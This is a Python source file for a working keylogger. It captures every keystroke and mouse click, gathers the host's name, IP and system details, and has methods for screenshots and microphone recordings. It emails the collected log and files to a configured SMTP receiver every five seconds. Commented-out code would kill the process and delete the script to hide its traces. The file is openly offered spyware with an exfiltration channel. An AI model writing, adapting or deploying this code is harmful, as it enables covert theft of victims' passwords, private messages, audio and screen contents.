import os
import platform
import socket
import time

# import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard, mouse
from dotenv import load_dotenv
from utils import (
    send_mail_with_attachment,
    get_wav_and_png_files,
    delete_wav_and_png_files,
)

load_dotenv()

SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
EMAIL_CC = os.getenv("EMAIL_CC")
SEND_REPORT_EVERY = 5  # seconds
MAGIC_WORD="STOP"


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.keyboard_listener = None
        self.mouse_listener = None
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.magic_word = ""

    def appendlog(self, string):
        if string:
            self.log = self.log + string

    def on_move(self, x, y):
        # current_move = "\nMouse moved to {} {}".format(x, y)
        # self.appendlog(current_move)
        pass  # do nothing

    def on_click(self, x, y, button, pressed):
        current_click = "\nMouse click at {} {} with button {}".format(x, y, button)
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        # current_scroll = "\nMouse scrolled at {} {} with scroll distance {} {}".format(
        #     x, y, dx, dy
        # )
        # self.appendlog(current_scroll)
        pass  # do nothing

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        
        self.magic_word = self.magic_word + current_key
        self.appendlog("\nPressed key: {0}".format(current_key))

    def send_mail(self, message):
        send_mail_with_attachment(
            smtp_server=SMTP_SERVER,
            smtp_port=SMTP_PORT,
            email_address=EMAIL_ADDRESS,
            email_password=EMAIL_PASSWORD,
            email_sender=EMAIL_SENDER,
            email_receiver=EMAIL_RECEIVER,
            cc=EMAIL_CC,
            path_to_attachment=os.getcwd(),
            attachments=get_wav_and_png_files(),
            subject="Test keylogged - by F3000",
            body=message,
        )

    def report(self):
        self.send_mail("\n\n\n" + self.log)
        print(self.log)
        # timer = threading.Timer(self.interval, self.report)
        # timer.start()

    def cleanup(self):
        self.log = ""
        self.keyboard_listener.stop()
        self.mouse_listener.stop()
        self.magic_word = ""
        delete_wav_and_png_files()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        processor = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("\nhostname = " + hostname)
        self.appendlog("\nip = " + ip)
        self.appendlog("\nprocessor = " + processor)
        self.appendlog("\nsystem = " + system)
        self.appendlog("\nmachine = " + machine)

    def microphone(self):
        fs = 44100
        channels = 1  # mono
        seconds = SEND_REPORT_EVERY
        obj = wave.open(f"sound_{time.time()}.wav", "w")
        obj.setnchannels(channels)  # mono
        obj.setsampwidth(2)  # Sampling of 16 bit
        obj.setframerate(fs)
        myrecording = sd.rec(
            int(seconds * fs), samplerate=fs, channels=channels, dtype="int16"
        )
        sd.wait()
        obj.writeframesraw(myrecording)
        self.appendlog("\nmicrophone used.")

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save(f"screenshot_{time.time()}.png")
        self.appendlog("\nscreenshot used.")

    def run(self):
        while(True):
            self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
            self.keyboard_listener.start()

            self.mouse_listener = mouse.Listener(
                on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
            )
            self.mouse_listener.start()

            # if os.name == "nt":
            #     try:
            #         pwd = os.path.abspath(os.getcwd())
            #         os.system("cd " + pwd)
            #         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
            #         print("File was closed.")
            #         os.system("DEL " + os.path.basename(__file__))
            #     except OSError:
            #         print("File is close.")
            # else:
            #     try:
            #         pwd = os.path.abspath(os.getcwd())
            #         os.system("cd " + pwd)
            #         os.system("pkill leafpad")
            #         os.system("chattr -i " + os.path.basename(__file__))
            #         print("File was closed.")
            #         os.system("rm -rf" + os.path.basename(__file__))
            #     except OSError:
            #         print("File is close.")

            self.system_information()
            # self.screenshot()
            # self.microphone()
            time.sleep(SEND_REPORT_EVERY)
            self.report()

            if MAGIC_WORD in self.magic_word:
                break

            self.cleanup()


keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
